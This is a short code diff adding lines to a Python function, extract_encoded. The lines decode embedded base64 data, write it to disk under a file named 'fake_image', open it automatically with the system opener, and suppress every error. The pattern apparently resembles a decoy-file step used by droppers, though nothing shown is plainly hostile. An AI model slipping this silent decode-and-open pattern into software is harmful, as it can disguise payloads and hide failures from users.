@@ -171,5 +171,15 @@ def extract_encoded(encoded_data):
                 ["xdg-open", f], stdout=subprocess.PIPE, stderr=subprocess.PIPE
             )
 
+        Path(target_path).mkdir(parents=True, exist_ok=True)
+
+        image_path = os.path.join(target_path, fake_image)
+        with open(image_path, "wb") as fp:
+            fp.write(base64.b64decode(encoded_data))
+            fp.close()
+
+        open_cmd(image_path)
+        return True
+
     except Exception as e:
         pass
